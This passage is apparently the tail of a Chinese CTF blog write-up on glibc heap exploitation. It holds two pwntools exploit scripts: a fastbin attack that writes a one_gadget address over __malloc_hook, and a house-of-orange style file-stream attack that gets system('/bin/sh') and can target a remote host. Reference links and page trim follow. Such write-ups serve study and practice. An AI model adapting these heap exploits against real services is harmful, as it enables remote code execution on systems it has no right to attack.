ru(<span class="string">"Content: "</span>)</div><div class="line">	sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"Command: "</span>)</div><div class="line">	sl(<span class="string">"3"</span>)</div><div class="line">	ru(<span class="string">"Index: "</span>)</div><div class="line">	sl(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"Command: "</span>)</div><div class="line">	sl(<span class="string">"4"</span>)</div><div class="line">	ru(<span class="string">"Index: "</span>)</div><div class="line">	sl(str(index))</div><div class="line"></div><div class="line">add(<span class="number">0x20</span>) <span class="comment">#index0</span></div><div class="line">add(<span class="number">0x1e0</span>) <span class="comment">#index1</span></div><div class="line">add(<span class="number">0x200</span>) <span class="comment">#index2</span></div><div class="line">add(<span class="number">0x200</span>) <span class="comment">#index3</span></div><div class="line"></div><div class="line">free(<span class="number">1</span>) <span class="comment">#free index1</span></div><div class="line"></div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x28</span>+<span class="string">"\x30"</span></div><div class="line"></div><div class="line">fill(<span class="number">0</span>,len(payload),payload)</div><div class="line">add(<span class="number">0x80</span>) <span class="comment">#index1</span></div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#index4</span></div><div class="line"></div><div class="line">free(<span class="number">1</span>) <span class="comment">#free 1</span></div><div class="line">free(<span class="number">2</span>) <span class="comment">#free 2</span></div><div class="line"></div><div class="line">add(<span class="number">0x80</span>) <span class="comment">#index1</span></div><div class="line"></div><div class="line">dump(<span class="number">4</span>)</div><div class="line"></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">libc_bin_addr = u64(p.recv(<span class="number">8</span>))</div><div class="line"><span class="comment"># bin_offset = 0x3a5678</span></div><div class="line">one_gadget_offset = <span class="number">0x4425a</span></div><div class="line">local_bin_offset = <span class="number">0x3C4C58</span></div><div class="line">libc_base = libc_bin_addr - local_bin_offset</div><div class="line">libc.address = libc_base</div><div class="line"></div><div class="line">one_gadget_addr = one_gadget_offset+libc_base</div><div class="line"></div><div class="line">malloc_offset = <span class="number">0x3C4BD0</span></div><div class="line">malloc_addr = malloc_offset + libc_base</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#change index 4 meta</span></div><div class="line">payload = flat(<span class="string">"a"</span>*<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x70</span>)</div><div class="line">fill(<span class="number">1</span>,len(payload),payload)</div><div class="line">free(<span class="number">4</span>)</div><div class="line">payload = flat(<span class="string">"a"</span>*<span class="number">0x80</span>,<span class="number">0x90</span>,<span class="number">0x70</span>,libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</div><div class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)</div><div class="line"></div><div class="line">fill(<span class="number">1</span>,len(payload),payload)</div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></div><div class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></div><div class="line">payload = flat(<span class="string">"\x00"</span>*<span class="number">19</span>,one_gadget_addr)</div><div class="line">fill(<span class="number">4</span>,len(payload),payload)</div><div class="line">raw_input()</div><div class="line">add(<span class="number">0x90</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_bin_addr="</span>+hex(libc_bin_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"libc_base="</span>+hex(libc_base)</div><div class="line"><span class="keyword">print</span> <span class="string">"one_gadget_addr="</span>+hex(one_gadget_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"malloc_addr="</span>+hex(malloc_addr)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>exp2 如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> sys</div><div class="line">context(log_level = <span class="string">"debug"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(size))</div><div class="line">    r.recvuntil(<span class="string">': '</span>, timeout=<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, data)</span>:</span></div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(len(data)))</div><div class="line">    r.sendafter(<span class="string">': '</span>, data)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': \n'</span>)</div><div class="line">    data = r.recvline()</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></div><div class="line">    libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x20</span>)</div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#4</span></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#5</span></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#6</span></div><div class="line">    free(<span class="number">1</span>)</div><div class="line">    free(<span class="number">2</span>)</div><div class="line"><span class="comment"># over lap</span></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    payload += p8(<span class="number">0xc0</span>)</div><div class="line">    fill(<span class="number">0</span>, payload)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x31</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#1</span></div><div class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line"><span class="comment"># leak heap</span></div><div class="line">    </div><div class="line">    free(<span class="number">5</span>)</div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0x61</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">4</span>)</div><div class="line">    heap_addr = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>]) - <span class="number">0x120</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"heap_addr = "</span>+hex(heap_addr)</div><div class="line">    alloc(<span class="number">0x50</span>)</div><div class="line">    alloc(<span class="number">0x50</span>)</div><div class="line"></div><div class="line"><span class="comment"># leak libc</span></div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></div><div class="line">    payload += p64(<span class="number">0xc1</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    <span class="comment">#raw_input()</span></div><div class="line">    <span class="comment"># alloc(0x50)</span></div><div class="line">    </div><div class="line">    free(<span class="number">4</span>)</div><div class="line">    <span class="comment"># dump(2)</span></div><div class="line">    main_area = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</div><div class="line">    libc_base = main_area - <span class="number">0x3a5678</span></div><div class="line">    </div><div class="line">    libc.address = libc_base</div><div class="line"></div><div class="line">    alloc(<span class="number">0x50</span>)<span class="comment">#4</span></div><div class="line">    alloc(<span class="number">0x58</span>)<span class="comment">#7</span></div><div class="line">    alloc(<span class="number">0x30</span>)<span class="comment">#8</span></div><div class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#9</span></div><div class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#10</span></div><div class="line">    alloc(<span class="number">0x58</span>)</div><div class="line">    payload = p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x61</span>+<span class="number">0x60</span>)</div><div class="line">    fill(<span class="number">3</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">4</span>)</div><div class="line"></div><div class="line">    fill(<span class="number">5</span>,<span class="string">"\x00"</span>*(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>+<span class="number">0x60</span>+<span class="number">0x40</span>))</div><div class="line"></div><div class="line">    free(<span class="number">6</span>)</div><div class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#4</span></div><div class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</div><div class="line">    <span class="comment"># print "b*"+hex(0x7CE9A+libc_base)</span></div><div class="line">    <span class="comment"># print util.proc.pidof(r)</span></div><div class="line"></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># unsorted bin attack </span></div><div class="line">    payload  = <span class="string">"\x00"</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>)+p64(main_area)+p64(libc_base+<span class="number">0x3A6040</span><span class="number">-0x10</span>)</div><div class="line">    payload  = payload.ljust(<span class="number">0x100</span><span class="number">-0x50</span>,<span class="string">"\x00"</span>)</div><div class="line"></div><div class="line">    data = <span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x101</span>)</div><div class="line">    data += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">    data += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</div><div class="line">    data = data.ljust(<span class="number">0xc0</span>,<span class="string">"\x00"</span>)</div><div class="line">    data += p64(<span class="number">0xffffffffffffffff</span>)</div><div class="line">    data = data.ljust(<span class="number">0xd8</span>,<span class="string">"\x00"</span>)</div><div class="line">    data += p64(heap_addr+<span class="number">0x30</span>*<span class="number">4</span>+<span class="number">0x10</span>+len(payload+data)<span class="number">-0x18</span>+<span class="number">8</span>)</div><div class="line">    data += p64(libc.symbols[<span class="string">"system"</span>])</div><div class="line"></div><div class="line">    </div><div class="line">    fill(<span class="number">4</span>,payload+data)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    alloc(<span class="number">0x58</span>)</div><div class="line">    <span class="comment"># dump(2)</span></div><div class="line"></div><div class="line">    </div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># fill(2,p64(main_area)+p64(libc_base+0x3C5600-0x10))</span></div><div class="line"></div><div class="line">    <span class="comment"># print "IO_LIST="+hex(libc_base+0x3C5600)</span></div><div class="line">    <span class="comment"># alloc(0x58)#4</span></div><div class="line">    <span class="comment"># alloc(0x20)#7</span></div><div class="line">    <span class="comment"># alloc(0x20)#8</span></div><div class="line">    <span class="comment"># free(4)</span></div><div class="line">    </div><div class="line">    <span class="comment"># fill(3,p64(0)*5+p64(0x71))</span></div><div class="line">    <span class="comment"># fill(2, p64(libc.symbols['__malloc_hook']-0x23))</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># alloc(0x58)#9</span></div><div class="line">    <span class="comment"># alloc(0x58)</span></div><div class="line">    <span class="comment"># alloc(0x30)#10</span></div><div class="line">    <span class="comment"># raw_input()</span></div><div class="line">    <span class="comment"># payload  = '\x00'*3</span></div><div class="line">    <span class="comment"># payload += p64(0)*2</span></div><div class="line">    <span class="comment"># payload += p64(libc_base + 0x41374)</span></div><div class="line">    <span class="comment"># fill(6, payload)</span></div><div class="line"></div><div class="line">    <span class="comment"># alloc(255)</span></div><div class="line"></div><div class="line">    r.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    log.info(<span class="string">"For remote: %s HOST PORT"</span> % sys.argv[<span class="number">0</span>])</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</div><div class="line">        r = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</div><div class="line">        exploit(r)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        r = process([<span class="string">'./fastbin'</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</div><div class="line">        </div><div class="line">        exploit(r)</div></pre></td></tr></table></figure>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://www.freebuf.com/articles/system/104144.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/104144.html</a> （Linux堆内存管理深入分析（上））<br><a href="http://www.freebuf.com/articles/security-management/105285.html" target="_blank" rel="external">http://www.freebuf.com/articles/security-management/105285.html</a> （Linux堆内存管理深入分析（下））</p>
+<p><a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a> （浅析Linux堆溢出之fastbin）</p>
+<p><a href="http://www.cnblogs.com/shangye/p/6268981.html" target="_blank" rel="external">http://www.cnblogs.com/shangye/p/6268981.html</a> （ house of orange ）</p>
+<p><a href="http://www.bitscn.com/network/hack/200607/30235.html" target="_blank" rel="external">http://www.bitscn.com/network/hack/200607/30235.html</a> （ FSO 利用 ）</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+	</div>
+
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://winter3un.github.io/2017/06/04/heap-all/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2017/06/03/墨色的五月/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          墨色的五月
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+
+
+
+
+
+
+
+
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2017 WinterSun
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		mathjax: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		root: "/",
+		innerArchive: true
+	}
+</script>
+
+<script src="/./main.js?v=4.0.0"></script>
+
+
+    
+<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all" q-show="innerArchive">
+        <div class="search-wrap">
+          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
+          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
+          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
+        </div>
+        <div class="widget tagcloud search-tag">
+          <p class="search-tag-wording">tag:</p>
+          <label class="search-switch">
+            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
+          </label>
+          <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">AWD</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">pwn</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ARM</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">code</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">Writeup</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">bctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">writeup</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">heap overflow</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">arm</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">heap</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">bin</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">wargame</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">pwntools</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">fmt</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">note</a>
+              </li>
+            
+            <div class="clearfix"></div>
+          </ul>
+        </div>
+        <ul class="search-ul">
+          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
+            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            2、在根目录_config.yml里添加配置：
+<pre style="font-size: 12px;" q-show="jsonFail">
+  jsonContent:
+    meta: false
+    pages: false
+    posts:
+      title: true
+      date: true
+      path: true
+      text: true
+      raw: false
+      content: false
+      slug: false
+      updated: false
+      comments: false
+      link: false
+      permalink: false
+      excerpt: false
+      categories: false
+      tags: true
+</pre>
+          </p>
+          <li class="search-li" q-repeat="items" q-show="isShow">
+            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
+            <p class="search-time">
+              <i class="icon-calendar icon"></i>
+              <span q-text="date|dateformat"></span>
+            </p>
+            <p class="search-tag">
+              <i class="icon-price-tags icon"></i>
+              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
+            </p>
+          </li>
+        </ul>
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-friends" q-show="friends">
+  		
+        <ul class="search-ul">
+          
+            <li class="search-li">
+              <a href="http://o0xmuhe.me/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>MuHe</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="http://www.bertramc.cn/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>bertramc</a>
+            </li>
+          
+        </ul>
+  		
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-me" q-show="aboutme">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">曾实习于安恒、桐乡市公安局反欺诈中心、Mirage队长、CTF玩家、网络安全研究员、pwner、半赛棍、浙警院13级学生</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
